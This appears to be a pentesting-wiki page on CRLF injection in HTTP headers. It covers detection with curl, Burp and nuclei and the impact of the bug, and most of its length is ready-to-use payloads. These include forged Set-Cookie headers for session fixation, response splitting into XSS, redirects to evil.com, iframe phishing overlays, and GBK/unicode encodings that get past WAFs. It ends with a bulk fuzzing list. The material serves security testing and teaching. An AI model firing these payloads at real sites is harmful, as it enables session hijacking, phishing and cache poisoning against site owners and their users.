---
tags:
  - Web
---

# :material-keyboard-return: CRLF Injection

<span class="pill pill-medium">header injection</span> <span class="pill pill-info">web</span>

**CRLF injection** happens when user input containing carriage-return / line-feed bytes (`\r\n` = `%0d%0a`) is written into a response header or a protocol message. Because `\r\n` is the delimiter between HTTP headers (and between headers and body), injecting it lets you forge new headers or split the response.

!!! abstract "TL;DR"
    Find input reflected into a response **header** (redirect `Location`, `Set-Cookie`, custom headers). Inject `%0d%0a` to add your own header; inject `%0d%0a%0d%0a` to break into the body → reflected XSS / response splitting.

## :material-magnify: Detection

Target any value that lands in a header — `url=`, `redirect=`, `lang=`, `Host`, cookie values:

```text
%0d%0aInjected-Header:%20pwned
%0d%0aSet-Cookie:%20session=attacker
%E5%98%8A%E5%98%8D            # unicode "ê˜" that some stacks normalize to CR/LF
```

Look for `Injected-Header: pwned` appearing in the raw response. Try single `%0a`, single `%0d`, and the pair — some parsers accept a lone LF.

### Confirming with cURL

*From "Master CRLF Injection: The Underrated Bug with Dangerous Potential" by [coffinxp](https://medium.com/@coffinxp).*

`curl -I` prints only the response headers — exactly where an injected line has to surface, so there is nothing to grep through:

```bash
curl -I "https://example.com/%0d%0aSet-Cookie:crlf=injected;"
```

A vulnerable host hands the forged header straight back:

```http
HTTP/2 301
date: Mon, 12 May 2025 12:46:42 GMT
content-type: text/html
location: https://example.com/
set-cookie: crlf=injected;
```

### Burp Repeater workflow

Intercept anything with a query parameter that ends up in a header (`?page=home`), send it to Repeater, and append a CRLF sequence to the value:

```text
home%0d%0aSet-Cookie:injected=1
```

Then diff the raw response. A forged `Set-Cookie` / `X-Test` line means the delimiter got through; a page whose layout suddenly breaks means you split the body instead.

```text
https://target.com/page=home
https://target.com/page=home%0d%0aSet-Cookie:crlf=1
```

`Set-Cookie: crlf=1` coming back in the response headers is the confirmation.

### Automating at scale

```bash
nuclei -u https://target.com -t cRlf.yaml
```

```bash
subfinder -d domain.com -all | nuclei -t cRlf.yaml
```

Template: [coffinxp/nuclei-templates — cRlf.yaml](https://github.com/coffinxp/nuclei-templates). It reports noticeably more vulnerable hosts than `crlfuzz` over the same scope. For mass scanning across mixed bug classes, [loxs](https://github.com/coffinxp/loxs) covers CRLF alongside SQLi/XSS/LFI/open-redirect.

## :material-fire: Impact

=== "HTTP response splitting → XSS"

    Inject a blank line to terminate the headers, then supply your own body:

    ```text
    /redirect?url=%0d%0aContent-Length:%200%0d%0a%0d%0a<html><script>alert(document.domain)</script></html>
    ```

=== "Session fixation / cookie injection"

    ```text
    %0d%0aSet-Cookie:%20sessionid=attacker-controlled;%20path=/
    ```

=== "Cache poisoning"

    Split the response so a shared cache stores your injected body against a legit URL — mass, stored impact. Chains with [Web Cache Poisoning](web-cache-poisoning.md).

=== "Open redirect / SSRF pivots"

    CRLF in a URL a server-side fetcher builds can inject headers into the *outbound* request — e.g. add `Metadata-Flavor: Google` to reach a cloud metadata endpoint. See [SSRF](ssrf.md).

## :material-ammunition: Real-world payloads

*From "Master CRLF Injection: The Underrated Bug with Dangerous Potential" by [coffinxp](https://medium.com/@coffinxp).*

Everything below goes in whatever value reaches a header. Work down the list: a single injected header proves the bug, a double CRLF proves you own the body.

### Basic header injection

The minimum viable proof — one extra header appended to the response. Enough on its own for a report, and often enough to confuse a cache or an access-control check downstream.

```text
%0d%0aX-Injection-Test: injected
```

### Cookie injection

Forging `Set-Cookie` is where header injection turns into session fixation, because you choose the victim's session identifier before they authenticate.

```text
%0d%0aSet-Cookie: hacked=true;
```

### `HTML` injection

Two CRLFs end the header block; anything after them is parsed as the body.

```text
%0d%0a%3Ch1%3ECoffinxp%3C%2Fh1%3E%0A%3Cp%3ECRLF%20Injection%20PoC%3C%2Fh1%3E
```

Decoded:

```html
<h1>Coffinxp</h1>
<p>CRLF Injection PoC</p>
```

### Redirection / phishing

Inject a link into the body of a page served from the real origin — the URL bar still shows the target domain, which is the whole point of the lure.

```text
%0d%0a%0d%0a%3CA%20HREF%3D%22https%3A%2F%2Fexample.com%2F%22%3ELogin%20Here%20%3C%2FA%3E%0A%0A
```

Decoded:

```html
<A HREF="https://example.com/">Login Here </A>
```

### Injecting dangerous `HTML` elements

A broken `src` fires `onerror`, so no `<script>` tag is needed at all.

```text
%0d%0a%0d%0a%3Cimg%20src%3Dx%20onerror%3Dprompt%281%29%3E
```

Decoded:

```html
<img src=x onerror=prompt(1)>
```

### Open redirect

Append your own `Location` header and the browser follows it — no redirect parameter required on the app side.

```text
%0d%0aLocation:%20https://evil.com
```

### XSS injection

```text
%0d%0a%0d%0a<script>alert('XSS via CRLF')</script>
```

### Redirecting with JavaScript injection

```text
%0d%0a%0d%0a%3Cscript%3Edocument.location.href%3D%22https%3A%2F%2Fevil.com%22%3C%2Fscript%3E
```

Decoded:

```html
<script>document.location.href="https://evil.com"</script>
```

### XSS protection bypass

Because you control the headers, you can also switch off the browser-side protections before delivering the payload — a fresh `Content-Type`, `X-XSS-Protection: 0`, then the body.

```text
%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.cookie%29%3C/script%3E
```

Decoded:

```http
?
Location:
Content-Type:text/html
X-XSS-Protection:0

<script>alert(document.cookie)</script>
```

That single payload injects new headers, terminates the response, and lands JavaScript in the body — cookie theft in one request.

### IFrame injection

A full-viewport iframe overlaying the real page: clickjacking and phishing in one payload.

```text
%0d%0a%0d%0a%3Ciframe%20src%3D%22https%3A%2F%2Fwww.nasa.gov%2F%22%20style%3D%22border%3A%200%3B%20position%3Afixed%3B%20top%3A0%3B%20left%3A0%3B%20right%3A0%3B%20bottom%3A0%3B%20width%3A100%25%3B%20height%3A100%25%22%3E%0A
```

Decoded:

```html
<iframe src="https://www.nasa.gov/" style="border: 0; position:fixed; top:0; left:0; right:0; bottom:0; width:100%; height:100%">
```

### HTTP response splitting

The full version: close the first response with a zero `Content-Length`, then write a complete second response of your own. Caches and browsers may treat that second block as an independent, valid reply.

```text
/vulnerable-endpoint?q=abc%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert('Split!')</script>
```

- `%0d%0a` ends the current header line
- `Content-Length: 0` terminates the original response
- a new `HTTP/1.1 200 OK` begins, carrying your script in its body
- the browser or an intermediary cache may accept the second block as a real response

## :material-tools: Payload encoding notes

```text
CR   = \r = %0d = %E5%98%8D (unicode overlong seen in some WAF bypasses)
LF   = \n = %0a = %E5%98%8A
CRLF = %0d%0a   ; double CRLF (%0d%0a%0d%0a) ends the header block
```

Try double-encoding (`%250d%250a`) when a first decode is stripped, and mixed `%0d`/`%0a` orders against lenient parsers.

### WAF bypass with GBK encoding

*From "Master CRLF Injection: The Underrated Bug with Dangerous Potential" by [coffinxp](https://medium.com/@coffinxp).*

When the obvious form gets blocked:

```text
/%0D%0ASet-Cookie:whoami=coffinxp
```

…reach for GBK characters whose low byte the stack later truncates down to a real CR or LF. The WAF sees a multibyte character, the parser sees a line break:

```text
嘍 = %E5%98%8D   (interpreted as CR)
嘊 = %E5%98%8A   (interpreted as LF)
```

Bypass payload:

```text
https://example.com/%E5%98%8D%E5%98%8ASet-Cookie:crlfinjection=coffinxp
```

Which lands as a real header:

```http
Set-Cookie: crlfinjection=coffinxp
```

The same trick covers the angle brackets, so the whole chain up to XSS can be smuggled the same way:

```text
< = 嘼 = %E5%98%BC
> = 嘾 = %E5%98%BE
```

Full CRLF → XSS payload:

```text
https://example.com/%E5%98%8D%E5%98%8ASet-Cookie:whoami=coffinxp%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%BCscript%E5%98%BEalert(1);%E5%98%BC/script%E5%98%BE
```

!!! tip "Unicode overflow"
    The same class of bug is PortSwigger's [Unicode codepoint truncation / overflow](https://portswigger.net/research/bypassing-character-blocklists-with-unicode-overflows) — worth a pass on every blocklist you meet, not just CRLF.

### Ready-to-fuzz payload list

Drop these straight onto the path or into a reflected parameter. Every variant here exists because some parser somewhere accepts exactly one of them:

```text
/%%0a0aSet-Cookie:coffin=hi
/%0aSet-Cookie:coffin=hi;
/%0aSet-Cookie:coffin=hi
/%0d%0aLocation: http://evil.com
/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23
/%0d%0a%0d%0a<script>alert('XSS')</script>;
/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg onload=alert(document.domain)>%0d%0a0%0d%0a/%2e%2e
/%0d%0aContent-Type: text/html%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert('XSS');</script>
/%0d%0aHost: {{Hostname}}%0d%0aCookie: coffin=hi%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aSet-Cookie: coffin=hi%0d%0a%0d%0a
/%0d%0aLocation: www.evil.com
/%0d%0aSet-Cookie:coffin=hi;
/%0aSet-Cookie:coffin=hi
/%23%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection:0%0d%0a%0d%0a<svg/onload=alert(document.domain)>
/%23%0aSet-Cookie:coffin=hi
/%25%30%61Set-Cookie:coffin=hi
/%2e%2e%2f%0d%0aSet-Cookie:coffin=hi
/%2Fxxx:1%2F%0aX-XSS-Protection:0%0aContent-Type:text/html%0aContent-Length:39%0a%0a<script>alert(document.cookie)</script>%2F../%2F..%2F..%2F..%2F../tr
/%3f%0d%0aLocation:%0d%0acoffin-x:coffin-x%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection:0%0d%0a%0d%0a<script>alert(document.domain)</script>
/%5Cr%20Set-Cookie:coffin=hi;
/%5Cr%5Cn%20Set-Cookie:coffin=hi;
/%5Cr%5Cn%5CtSet-Cookie:coffin%5Cr%5CtSet-Cookie:coffin=hi;
/%E5%98%8A%E5%98%8D%0D%0ASet-Cookie:coffin=hi;
/%E5%98%8A%E5%98%8DLocation:www.evil.com
/%E5%98%8D%E5%98%8ALocation:www.evil.com
/%E5%98%8D%E5%98%8ASet-Cookie:coffin=hi
/%E5%98%8D%E5%98%8ASet-Cookie:coffin=hi;
/%E5%98%8D%E5%98%8ASet-Cookie:coffinxp=coffinxp
/%u000ASet-Cookie:coffin=hi;
/www.evil.com/%2E%2E%2F%0D%0Acoffin-x:coffin-x
/www.evil.com/%2F..%0D%0Acoffin-x:coffin-x
```

## :material-link-variant: Related

- Enables [Open Redirect](open-redirect.md), [XSS](xss.md), and [Web Cache Poisoning](web-cache-poisoning.md).
- Outbound-header injection assists [SSRF](ssrf.md) and [HTTP Request Smuggling](request-smuggling.md).
- Reference: [OWASP CRLF Injection](https://owasp.org/www-community/vulnerabilities/CRLF_Injection).
- Deep dives: [HackTricks — CRLF (%0D%0A) Injection](https://book.hacktricks.wiki/en/pentesting-web/crlf-0d-0a.html), [PortSwigger — Making HTTP header injection critical via response queue poisoning](https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning).
